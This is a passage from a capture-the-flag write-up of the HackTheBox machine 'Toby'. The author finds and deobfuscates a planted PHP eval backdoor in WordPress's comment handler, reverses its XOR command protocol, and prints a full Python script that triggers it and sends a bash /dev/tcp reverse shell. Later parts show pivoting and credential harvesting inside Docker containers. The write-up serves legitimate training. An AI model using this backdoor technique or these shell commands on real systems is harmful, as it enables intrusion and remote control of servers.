---
title: HTB: Toby
url: https://0xdf.gitlab.io/2022/04/16/htb-toby.html
date: 2022-04-16T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: hackthebox, ctf, htb-toby, nmap, vhosts, wfuzz, wordpress, backdoor, wpscan, gogs, git, source-code, feroxbuster, cyberchef, crypto, php-deobfuscation, wireshark, python, youtube, docker, pivot, hashcat, chisel, pam, ghidra, htb-kryptos
---

![Toby](https://0xdfimages.gitlab.io/img/toby-cover.png)

Toby was a really unique challenge that involved tracing a previous attackers steps and poking a backdoors without full information about how they work. I’ll start by getting access to PHP source that shows where a webshell is loaded, but not the full execution. I’ll have to play with it to get it to give execution, figuring out how it communicates. From there I’ll pivot into a MySQL container and get hashes to get into the Gogs instance. Source code analysis plus some clever password generation allows me to pivot onto the main host, where I’ll have to use trouble tickets to find a PAM backdoor and brute force the password.

## Box Info

| Name | [Toby](https://hackthebox.com/machines/toby)  [Toby](https://hackthebox.com/machines/toby) [Play on HackTheBox](https://hackthebox.com/machines/toby) |
| --- | --- |
| Release Date | [06 Nov 2021](https://twitter.com/hackthebox_eu/status/1456287135355580417) |
| Retire Date | 16 Apr 2022 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Toby |
| Radar Graph | Radar chart for Toby |
| First Blood User | 03:11:11[pottm pottm](https://app.hackthebox.com/users/141036) |
| First Blood Root | 03:43:30[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [InfoSecJack InfoSecJack](https://app.hackthebox.com/users/52045) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.140
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 16:07 EDT
Nmap scan report for 10.10.10.140
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 106.38 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.140
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 16:09 EDT
Nmap scan report for 10.10.10.140
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87:ee:18:b2:5a:01:e3:ac:aa:5f:cb:37:59:2a:e6:4f (RSA)
|   256 3d:06:82:8a:ec:12:bd:c3:ec:fe:d5:ce:a0:f2:e6:b9 (ECDSA)
|_  256 d5:6e:9b:a2:7d:e0:1e:af:a3:8d:35:a8:7d:d9:22:74 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: WordPress 5.7.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Toby&#039;s Blog! \xF0\x9F\x90\xB4 &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 Focal.

It does show the site is running WordPress 5.7.2.

### Vhosts

#### Burp

Loading the site in Firefox by IP doesn’t look nice. This isn’t surprising, as WordPress doesn’t like being accessed by IP typically. Checking Burp, it’s trying to get resources from `wordpress.toby.htb`:

![image-20211007161613925](https://0xdfimages.gitlab.io/img/image-20211007161613925.png)

I’ll add the domain and subdomain to `/etc/hosts`:

```
10.10.10.140 toby.htb wordpress.toby.htb

```

#### wfuzz

Given the virtual hosts, I’ll fuzz for more, and find `backup.toby.htb`:

```

oxdf@hacky$ wfuzz -u http://toby.htb -H "Host: FUZZ.toby.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 10814
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://toby.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000055:   200        254 L    615 W      7837 Ch     "backup"
000000326:   200        151 L    549 W      10758 Ch    "wordpress"
000001413:   301        0 L      0 W        0 Ch        "www.wordpress"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4986
Requests/sec.: 0

```

`www.wordpress.toby.htb` just redirects to `wordpress.toby.htb`. I’ll add `backup` to `/etc/hosts` as well.

### wordpress.toby.htb - TCP 80

#### Site

The site is a blog about horses:

[![image-20211008065122940](https://0xdfimages.gitlab.io/img/image-20211008065122940.png)](https://0xdfimages.gitlab.io/img/image-20211008065122940.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211008065122940.png)

The text in the first post has a subtle hint:

> Hi All! I’m back! And so are my pictures of 🐴 🙂 I managed to get all of them back after the attack because I had them up in the ☁

For each post, there’s an option to leave a comment. I’ll fill it out, and put in an HTML tag to check for potential XSS:

![image-20211008065420162](https://0xdfimages.gitlab.io/img/image-20211008065420162.png)

This submits a POST request to `/wp-comments-post-.php`:

```

POST /wp-comments-post.php HTTP/1.1
Host: wordpress.toby.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 219
Origin: http://wordpress.toby.htb
DNT: 1
Connection: close
Referer: http://wordpress.toby.htb/2021/07/14/horses/
Cookie: comment_author_9567f8b202e711f077d387d1674f00f7=sadf; comment_author_email_9567f8b202e711f077d387d1674f00f7=asdf%40aol.com
Upgrade-Insecure-Requests: 1

comment=test+comment%0D%0A%3Cb%3Ebold+text%3C%2Fb%3E&author=0xdf&email=0xdf%40toby.htb&url=http%3A%2F%2F10.10.14.6%2Fwebsiteincomment&wp-comment-cookies-consent=yes&submit=Post+Comment&comment_post_ID=5&comment_parent=0

```

The page says that the comment is waiting for moderation:

![image-20211008065520251](https://0xdfimages.gitlab.io/img/image-20211008065520251.png)

Interestingly, the bold did come through. I’ll watch this post to see if it gets moderated in some way, or if there’s any other indication of it’s being interacted with.

#### wpscan

I’ll run `wpscan` to look for WP issues:

```

oxdf@hacky$ wpscan --url http://wordpress.toby.htb -e ap,t,tt,u --api-token $WPSCAN_API
...[snip]...

```

The core WordPress is 5.7.2, and it identifies three issues:

```

...[snip]...
[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.toby.htb/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://wordpress.toby.htb/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.7.3
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.7.3
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.7.3
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
...[snip]...

```

I couldn’t find much info on any of these.

The site doesn’t seem to have any plugins installed:

```

...[snip]...
[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.
...[snip]...

```

Nothing else really interesting here.

### backup.toby.htb

#### Site

This host is an instance of Gogs, and open source Git service:

![image-20211008072041718](https://0xdfimages.gitlab.io/img/image-20211008072041718.png)

I am able to register an account, but it doesn’t get access to much.

The “Explore” link has lists for Repositories, Users, and Organizations. The other two don’t have anything, but there are two users, me, and toby-admin:

![image-20211008072236492](https://0xdfimages.gitlab.io/img/image-20211008072236492.png)

Clicking on toby-admin doesn’t show much:

![image-20211008072312863](https://0xdfimages.gitlab.io/img/image-20211008072312863.png)

#### Enumerate Repos

In Gogs, even if a repo is hidden from listing, it is possible to brute force repo names for a given user. I’ll use [FeroxBuster](https://github.com/epi052/feroxbuster):

```

oxdf@hacky$ feroxbuster -u http://backup.toby.htb/toby-admin 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://backup.toby.htb/toby-admin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      453l      986w        0c http://backup.toby.htb/toby-admin/backup
200      453l      986w        0c http://backup.toby.htb/toby-admin/Backup
200      453l      986w        0c http://backup.toby.htb/toby-admin/BACKUP
200      453l      986w        0c http://backup.toby.htb/toby-admin/BackUp
200        0l        0w        0c http://backup.toby.htb/toby-admin/stars
200      236l      428w        0c http://backup.toby.htb/toby-admin/followers
200      236l      428w        0c http://backup.toby.htb/toby-admin/following
[####################] - 3m     29999/29999   0s      found:7       errors:1      
[####################] - 3m     29999/29999   138/s   http://backup.toby.htb/toby-admin

```

`/stars` returns a 0 length page, and `/followers` and `/following` return some page templating but just show no other users.

`/backup` is interesting.

#### backup

The backup repo has a single folder, wordpress.toby.htb:

![image-20211008074553808](https://0xdfimages.gitlab.io/img/image-20211008074553808.png)

In it is `html`, which then has all the files for a WordPress install:

[![image-20211008074634443](https://0xdfimages.gitlab.io/img/image-20211008074634443.png)](https://0xdfimages.gitlab.io/img/image-20211008074634443.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20211008074634443.png)

I’ll download a copy of the repo with `git`:

```

oxdf@hacky$ git clone http://backup.toby.htb/toby-admin/backup.git
Cloning into 'backup'...
remote: Enumerating objects: 1613, done.
remote: Counting objects: 100% (1613/1613), done.
remote: Compressing objects: 100% (1433/1433), done.
remote: Total 1613 (delta 123), reused 1613 (delta 123)
Receiving objects: 100% (1613/1613), 10.80 MiB | 1.83 MiB/s, done.
Resolving deltas: 100% (123/123), done.

```

## Shell as www-data on wordpress

### Identify Backdoor

#### Find Backdoor

There as a reference to having been hacked on the blog, which is a hint to look for backdoors the WordPress instance. Looking for dangerous strings in PHP will lead to this block in `wp-includes/comment.php`:

```

function wp_handle_comment_submission( $comment_data ) {

    $comment_post_ID      = 0;
    $comment_parent       = 0;
    $user_ID              = 0;
    $comment_author       = null;
    $comment_author_email = null;
    $comment_author_url   = null;
    $comment_content      = null;

    if ( isset( $comment_data['comment_post_ID'] ) ) {
        $comment_post_ID = (int) $comment_data['comment_post_ID'];
    }
    if ( isset( $comment_data['author'] ) && is_string( $comment_data['author'] ) ) {
        $comment_author = trim( strip_tags( $comment_data['author'] ) );
    }
    if ( isset( $comment_data['email'] ) && is_string( $comment_data['email'] ) ) {
        $comment_author_email = trim( $comment_data['email'] );
    }
    if ( isset( $comment_data['url'] ) && is_string( $comment_data['url'] ) ) {
        $comment_author_url = trim( $comment_data['url'] );
    }
    if ( isset( $comment_data['comment'] ) && is_string( $comment_data['comment'] ) ) {
        $comment_content = trim( $comment_data['comment'] );
    }
    if ( isset( $comment_data['comment_parent'] ) ) {
        $comment_parent = absint( $comment_data['comment_parent'] );
    }

    // aded to validte  my ownemail against my  internal scrit
    // ba4fb13188ee48077524f9ac23c230250c5661aec9776389e8befbce277c72de - ignore
    eval(gzuncompress(str_rot13(base64_decode('a5wUmlLSs+wWUodmvyoauDVkCx608xfu7oz+...[snip]...

```

After a series of collecting the various fields and saving them in variables, there’s this `eval` call. It’s very suspect to have something passed through a few layers of encoding, then decompressed, and passed to `eval`. At this point, it’s not clear what the 64 characters string in the comment starting with “ba4f” is, but it looks like a SHA256 hash. The typos / poor english in the comments are also a potential indicator of maliciousness (though also could just be sloppy on toby’s part).

#### Backdoor Context

This suspect code is in the `wp_handle_comment_submission` function. That function is called from a `wp-comments-post.php`, which is where my POST to submit a comment went earlier:

```

oxdf@hacky$ grep -r wp_handle_comment_submission backup/
backup/wordpress.toby.htb/html/wp-comments-post.php:$comment = wp_handle_comment_submission( wp_unslash( $_POST ) );
backup/wordpress.toby.htb/html/wp-includes/comment.php:function wp_handle_comment_submission( $comment_data ) {
backup/wordpress.toby.htb/html/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php:             * comment_content. See wp_handle_comment_submission().

```

In that file, it passes the full `$_POST` object (the request) into `wp_handle_comment_submission`.

### Decode

#### Manual

I’ll use `grep` and `cut` to get the base64-encoded blob into a file:

```

oxdf@hacky$ cat wp-includes/comment.php | grep 'eval(gzuncompres' | cut -d "'" -f2 > backdoor.b64

```

I tried loading that into CyberChef, but it fails:

[![image-20211008083142459](https://0xdfimages.gitlab.io/img/image-20211008083142459.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211008083142459.png)

I think it’s probably the fact that the code is doing a ROT13 on binary data, which is a non-standard action, and it’s likely that PHP is doing something different from CyberChef. It’s also possible that I’m using the wrong decompress mechanism.

I switched to using PHP to obfuscate by putting the long line into a file byitself with `<?php` before and `?>` after. I’ll replace `eval` with `echo`:

```

<?php
echo gzuncompress(str_rot13(base64_decode('a5wUmlLSs+wWUodmvyoauDV...[snip]...
?>

```

Running it prints a different similarly obfuscated `eval` statement:

```

oxdf@hacky$ php backdoor.php
eval(gzinflate(base64_decode(str_rot13('UW3UohgXSxH/ck/NNGASQaeNGQUaAUytmwam61ih...[snip]...

```

I can do the same thing again, and I get another one. It’s clearly nested several times.

#### Deobfuscator

Some googling for PHP deobfuscators found many. Many of them choked on this code, but [this one from Mobilefish](https://www.mobilefish.com/services/eval_gzinflate_base64/eval_gzinflate_base64.php) handled it very nicely, providing deobfuscated code and this report:

```

Number of decoded steps applied
=======================================================================
80

The PHP code is encoded by the following nested functions sequence
=======================================================================
001 - eval(gzuncompress(str_rot13(base64_decode('...'))))
002 - eval(gzinflate(base64_decode(str_rot13('...'))))
003 - eval(gzinflate(base64_decode(strrev(str_rot13('...')))))
004 - eval(gzinflate(base64_decode(str_rot13('...'))))
005 - eval(gzinflate(str_rot13(base64_decode('...'))))
...[snip]...
071 - eval(gzinflate(base64_decode(str_rot13('...'))))
072 - eval(gzinflate(base64_decode(str_rot13(strrev('...')))))
073 - eval(gzinflate(base64_decode(rawurldecode('...'))))
074 - eval(gzuncompress(base64_decode('...')))
075 - eval(gzinflate(base64_decode('...')))
076 - eval(gzuncompress(base64_decode(str_rot13('...'))))
077 - eval(str_rot13(gzinflate(str_rot13(base64_decode('...')))))
078 - eval(gzinflate(base64_decode(strrev('...'))))
079 - eval(gzinflate(str_rot13(base64_decode('...'))))
080 - eval(str_rot13(gzinflate(base64_decode('...'))))

```

I added some whitespace to the code to make the result more readable:

```

if ($comment_author_email == "help@toby.htb" && $comment_author_url== "http://test.toby.htb/" && substr($comment_content,0,8) == "746f6279" {
    $a=substr($comment_content,8);
    $host=explode(":",$a)[0];
    $sec=explode(":",$a)[1];
    $d="/usr/bin/wordpress_comment_validate";
    include $d;
    wp_validate_4034a3($host,$sec);
    return new WP_Error('unspecified error');
}

```

The code is looking for a comment with the email “help@toby.htb”, a specific url, and a comment that starts with eight specific characters. It then takes the rest of the content and splits (`explode`) it on “:”, with the first saved as `$host` and the second as `$sec`. It then passes those to a function I don’t have access to at this time.

### Trigger

Because there’s a `$host` variable, I can guess that it’s making a connection to the given host. It’s not clear what `$sec` is. It would make sense if it were a port number, but the variable name doesn’t fit. It could be “secret”? As port is the best thing I can guess, I’ll try something that looks like a port.

I’ll open Wireshark listening on tun0, and submit this comment:

![image-20220413154213487](https://0xdfimages.gitlab.io/img/image-20220413154213487.png)

With a Wireshark display filter of `!tcp.port==80`, there’s only two other packets that show up, an attempt to connect to my host on TCP 20053:

![image-20220413154319875](https://0xdfimages.gitlab.io/img/image-20220413154319875.png)

### Initial Message

#### Understand $sec

If I open up `nc` to catch the connection, and kick that POST request over to Repeater to send again, it gets a message:

```

oxdf@hacky$ nc -lvnp 20053
Listening on 0.0.0.0 20053
Connection received on 10.10.11.121 42058
0d6617ff-8bae-42a8-b9bf-eb836da95803|786f725f6b65793a30663031316431623134313630313032306431633162303031623066303131643162313731313032303230643163

```

If I change the `comment` from `746f627910.10.14.6:4444` to `746f627910.10.14.6:0xdf`, the message comes back empty and immediately closes the connection. Some playing around shows that it only works if `$sec` is an even number of hex characters (0-9a-fA-F).

The GUID before the `|` seems to change each connection. But sending the same `$sec` returns the same string after the `|`, and changing `$sec` leads to a new string.

If I send `$sec` as `00`, it returns:

```

786f725f6b65793a34623435353935663530353234353436343935383566353135663462343535393566353335353436343634393538

```

Changing that to `01`:

```

786f725f6b65793a34613434353835653531353334343437343835393565343635653461343435383565353235343437343734383539

```

The first nine bytes (18 hex characters) are the same, but then every other byte is different by one bit. Because it’s in hex, I’ll try to decode it:

```

oxdf@hacky$ echo "786f725f6b65793a34623435353935663530353234353436343935383566353135663462343535393566353335353436343634393538" | xxd -r -p
xor_key:4b45595f5052454649585f515f4b45595f535546464958

```

That explains why the first eight bytes don’t change, as they are the string “xor\_key:”. The thing after that seems to be based on `$sec`.

#### Next Level $sec

I’ll write a simply Python server to catch these connections and print what I’m looking for:

```

#!/usr/bin/env python3

import binascii
import socket
from itertools import cycle

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',20053))

s.listen(1)
while True:
    c, address = s.accept()
    data = c.recv(1024)
    guid, hex_msg = data.split(b'|')
    msg = binascii.unhexlify(hex_msg.strip())
    print(f'{msg=}')
    c.close()

s.close()

```

With this script listening, I’ll send some different `$sec` to see if I can figure out how it works (`$sec` is added as a comment at the end):

```

oxdf@hacky$ python3 c2.py
msg=b'xor_key:4b45595f5052454649585f515f4b45595f535546464958' # 00
msg=b'xor_key:4a44585e5153444748595e4e5e4a44585e525447474859' # 01
msg=b'xor_key:4b44595e5053454749595f575f4a45585f525547464858' # 0001
msg=b'xor_key:4a44585e5153444748595e575e4a44585e525447474859' # 0101
msg=b'xor_key:4a45585f5152444648585e575e4b44595e535446474959' # 0100

```

It looks like the `$sec` is being XORed in. It also looks like all the hex bytes here are in the ASCII range, and they do decode:

```

oxdf@hacky$ echo "4b45595f5052454649585f515f4b45595f535546464958" | xxd -r -p
KEY_PREFIX_Q_KEY_SUFFIX

```

I actually missed it earlier, but there’s one byte that does change each time, and that’s the character in the middle.

I’ll update the script a bit:

```

#!/usr/bin/env python3

import socket
from binascii import unhexlify
from itertools import cycle

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',20053))

s.listen(1)
while True:
    c, address = s.accept()
    data = c.recv(1024)
    guid, hex_msg = data.split(b'|')
    msg = unhexlify(hex_msg.strip())
    xor_key = unhexlify(msg.split(b':')[-1])

    print(f'{xor_key=}')                                                             
    c.close()

s.close() 

```

If I send `00` several times in a row:

```

xor_key=b'KEY_PREFIX_P_KEY_SUFFIX'
xor_key=b'KEY_PREFIX_Y_KEY_SUFFIX'
xor_key=b'KEY_PREFIX_F_KEY_SUFFIX'
xor_key=b'KEY_PREFIX_T_KEY_SUFFIX'

```

If I change `00` to `01`, it changes the low bit of each character:

```

xor_key=b'JDX^QSDGHY^K^JDX^RTGGHY'
xor_key=b'JDX^QSDGHY^O^JDX^RTGGHY'
xor_key=b'JDX^QSDGHY^T^JDX^RTGGHY'

```

`$sec` of `AA` makes gibberish:

```

xor_key=b'\xe1\xef\xf3\xf5\xfa\xf8\xef\xec\xe3\xf2\xf5\xfd\xf5\xe1\xef\xf3\xf5\xf9\xff\xec\xec\xe3\xf2'
xor_key=b'\xe1\xef\xf3\xf5\xfa\xf8\xef\xec\xe3\xf2\xf5\xef\xf5\xe1\xef\xf3\xf5\xf9\xff\xec\xec\xe3\xf2'

```

### Send Commands

#### Plaintext - Fail

Given this is a backdoor, and it’s connecting back to me, presumably I can send it commands. Since I have no idea what that format looks like, I’ll have to do some guessing. I can try just replying with a command:

```

    c, address = s.accept()
    print(f'[+] Connection from {address}')
    data = c.recv(1024)
    guid, hex_msg = data.split(b'|')
    msg = unhexlify(hex_msg.strip())
    xor_key = unhexlify(msg.split(b':')[-1])

    print(f'{xor_key=}')

    cmd = "id"
    c.send(f"{cmd}\n".encode())
    print(c.recv(1024))            
    c.close()

s.close()

```

I’ll just use `$sec` of `00` until I see some reason to do otherwise, as that just leaves things as plaintext. On sending that, there is a response:

```

oxdf@hacky$ python3 c2.py 
[+] Connection from ('10.10.10.140', 55498)
xor_key=b'KEY_PREFIX_I_KEY_SUFFIX'
b'413588b1-b38f-4f82-b07f-79a49b75dfb7|2a242d73\n'

```

The first bit is the same GUID from the initial connection, so it seems to be some kind of session id.

The data is useless:

```

oxdf@hacky$ echo "2a242d73" | xxd -r -p
*$-s

```

But if I XOR it with the `I` character from the message above:

```

>>> msg = '2a242d73'
>>> bytes([x^ord('I') for x in unhexlify(msg)])
b'cmd:'

```

#### One Byte XOR

Given that I am given an XOR key and it applies to the messages coming back, I’ll try XOR my command with that.

```

import socket
from binascii import unhexlify
from itertools import cycle

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',20053))

s.listen(1)
while True:
    c, address = s.accept()
    print(f'[+] Connection from {address[0]}')
    data = c.recv(1024)
    guid, hex_msg = data.split(b'|')
    print(f'[*] Session ID: {guid}')
    msg = unhexlify(hex_msg.strip())
    xor_msg = unhexlify(msg.split(b':')[-1])
    xor_chr = xor_msg.split(b'_')[2]
    assert(len(xor_chr) == 1)

    print(f'[*] XOR key: {xor_chr.decode()}')

    xor = ord(xor_chr)
    cmd = b"id"
    encoded_cmd = bytes([x^xor for x in cmd])
    c.send(encoded_cmd)
    resp = c.recv(1024).strip()
    new_guid, msg = resp.split(b'|')
    assert(new_guid == guid)
    pt_msg = bytes([x^xor for x in unhexlify(msg)]).decode()
    print(f'{pt_msg}')
    c.close()

s.close() 

```

It works!

```

oxdf@hacky$ python3 c2.py 
[+] Connection from 10.10.10.140
[*] Session ID: b'56520806-f755-4571-93f1-7e070b81e374'
[*] XOR key: J
cmd:uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Reverse Shell

I’ll test changing `id` to a bash reverse shell in the script:

```

    cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"

```

I’ll save that and send it, and run it. On clicking Send in Repeater, there’s a the connection:

```

oxdf@hacky$ python3 c2.py 
[+] Connection from 10.10.10.140
[*] Session ID: b'9441aaf0-856a-46a0-a9ee-8c3180e4fc3d'
[*] XOR key: Q

```

And then a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.140.
Ncat: Connection from 10.10.10.140:45002.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@wordpress:/var/www/html$

```

No Python on the box, but `script` works for a shell upgrade:

```

www-data@wordpress:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@wordpress:/var/www/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@wordpress:/var/www/html$

```

### Script

In case I need to come back and get a shell again, I’ll update my script to handle the POST request as well as the sending of the command. It takes my local IP and the port I want a shell on. First it sets up the listening port. If I don’t do this first, the response can come in before I’m listening for it. But `s.listen(1)` isn’t blocking, so I can call that and then continue. Next I’ll send the POST to trigger the connection back on 20053. After that, I’ll accept the connection, and send the reverse shell.

```

#!/usr/bin/env python3

import requests
import socket
import sys
from binascii import unhexlify

if len(sys.argv) != 3:
    print(f"Get shell from wordpress.toby.htb\n\n{sys.argv[0]} LHOST LPORT")
    sys.exit()

ip = sys.argv[1]
port = sys.argv[2]

# set up listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',20053))
s.listen(1)

# trigger connection
try:
    requests.post('http://wordpress.toby.htb/wp-comments-post.php',
        data = {"comment": f"746f6279{ip}", "author": "0xdf",
            "email": "help@toby.htb", "url": "http://test.toby.htb/",
            "wp-comment-cookies-consent": "yes", "submit": "Post Comment",
            "comment_post_ID": "5", "comment_parent": "0"},
        timeout = 0.5)
except requests.exceptions.Timeout:
    pass

# accept and request shell
c, address = s.accept()
print(f'[+] Connection from {address[0]}')
data = c.recv(1024)
guid, hex_msg = data.split(b'|')
print(f'[*] Session ID: {guid}')
msg = unhexlify(hex_msg.strip())
xor_msg = unhexlify(msg.split(b':')[-1])
xor_chr = xor_msg.split(b'_')[2]
assert(len(xor_chr) == 1)

print(f'[*] XOR key: {xor_chr.decode()}')
xor = ord(xor_chr)

cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'".encode()
encoded_cmd = bytes([x^xor for x in cmd])
print(f'[*] Triggering shell. Watch at listening nc.')
c.send(encoded_cmd)
resp = c.recv(1024).strip()
new_guid, msg = resp.split(b'|')
assert(new_guid == guid)
pt_msg = bytes([x^xor for x in unhexlify(msg)]).decode()
print(f'{pt_msg}')

c.close()
s.close()    

```

On running this, I get a reverse shell at a listening `nc`.

There were some interesting timing issues I ran into writing this, which I’ll go into on [this video](https://youtu.be/IF7bPHRDlv8):

## Shell as jack on mysql

### Enumeration

#### Docker

Very quickly it’s clear that I’m in a Docker container. There’s very few tools (no `ping`, `ifconfig`, `ip`, `ss`, `netstat`, etc.), `/home` is empty, and there’s a `.dockerenv` file in the system root. The hostname is wordpress.toby.htb. `/proc/net/fib_trie` shows an IP of 172.69.0.101.

The container is pretty empty. There’s a password and hostname for the MySQL DB in `/var/www/html/wp-config.php`:

```

...[snip]...
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );           
                                                    
/** MySQL database username */                                                                           
define( 'DB_USER', 'root' );
                                                    
/** MySQL database password */
define( 'DB_PASSWORD', 'OnlyTheBestSecretsGoInShellScripts' );       
                                                    
/** MySQL hostname */
define( 'DB_HOST', 'mysql.toby.htb' );
                                                    
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
                                                    
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' ); 
...[snip]...

```

#### Network

I’ll turn to the rest of the network. Without `ping`, I need a way to look for other hosts. `dig` is installed, and it tells me that `mysql.toby.htb` is on 172.69.0.102, and it agrees that wordpress is on .101:

```

www-data@wordpress:/var/www/html$ dig +short mysql.toby.htb 
172.69.0.102
www-data@wordpress:/var/www/html$ dig +short wordpress.toby.htb
172.69.0.101

```

`-x` will try a reverse lookup, and it is enabled on the DNS server:

```

www-data@wordpress:/var/www/html$ dig +short -x 172.69.0.101                  
wordpress.tobynet.

```

The `tobynet` thing is new, but it does work:

```

www-data@wordpress:/var/www/html$ dig +short wordpress.tobynet 
172.69.0.101

```

I’ll write a loop to see what I can find:

```

www-data@wordpress:/var/www/html$ for i in {1..255}; do res=$(dig +short -x 172.69.0.${i}); if [ ! -z "$res" ]; then echo "172.69.0.${i}  $res"; fi; done
172.69.0.100  b92835f39149.tobynet.
172.69.0.101  wordpress.tobynet.
172.69.0.102  mysql.tobynet.
172.69.0.103  backup.toby.htb.
172.69.0.104  personal.tobynet.
172.69.0.105  gogs.tobynet.

```

I suspect 100 is the host. The others fit into what I’ve seen so far, except personal is new.

`curl` against personal returns a page:

```

www-data@wordpress:/var/www/html$ curl -s personal.toby.htb
<html>                                             
        <head>                                                                                                                          
                <title> Jack's Personal Webapp </title>             
